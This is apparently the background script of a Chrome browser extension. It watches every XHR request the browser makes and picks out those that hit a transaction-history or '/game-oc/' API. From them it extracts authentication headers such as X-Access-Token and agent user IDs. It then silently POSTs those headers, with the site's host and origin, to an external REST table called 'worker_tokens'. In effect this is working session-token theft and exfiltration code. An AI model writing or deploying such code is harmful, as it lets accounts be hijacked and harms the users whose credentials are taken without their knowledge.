import { URL, KEY } from './config.js';

const API_MATCH = /queryTransactionHistoryListForUser|\/game-oc\//;
const HDR_NAMES = ['X-Access-Token', 'X-Agent-Pkid', 'X-Agent-Role', 'X-Agent-Suid', 'X-Agent-User', 'X-Agent-UserId', 'X-Agent-Voice'];

function hostOf(u) {
  try { return new URL(u).hostname.replace(/^www\./, ''); } catch (e) { return ''; }
}

function pick(list) {
  const map = {};
  for (const pair of list || []) map[pair.name] = pair.value;
  const out = {};
  for (const k of HDR_NAMES) {
    const v = map[k];
    if (v !== undefined && v !== null && v !== '') out[k] = String(v);
  }
  return out;
}

async function send(host, base, headers) {
  try {
    const r = await fetch(URL + '/rest/v1/worker_tokens', {
      method: 'POST',
      headers: { apikey: KEY, Authorization: 'Bearer ' + KEY, 'Content-Type': 'application/json', Prefer: 'return=minimal' },
      body: JSON.stringify({ host, base, headers })
    });
    if (!r.ok) console.warn('[wt] send fail status', r.status);
  } catch (e) {
    console.warn('[wt] send err', String(e.message || e));
  }
}

function onSend(details) {
  try {
    const u = details.url || '';
    if (!API_MATCH.test(u)) return;
    const h = pick(details.requestHeaders);
    if (!h['X-Access-Token'] || h['X-Access-Token'].length < 10) return;
    const host = hostOf(u);
    if (!host) return;
    const key = host + '|' + h['X-Access-Token'];
    chrome.storage.local.get({ last: '' }).then(({ last }) => {
      if (last !== key) {
        chrome.storage.local.set({ last: key });
        send(host, new URL(u).origin, h);
      }
    });
  } catch (e) {}
}

chrome.webRequest.onSendHeaders.addListener(onSend, { urls: ['<all_urls>'], types: ['xmlhttprequest'] }, ['requestHeaders', 'extraHeaders']);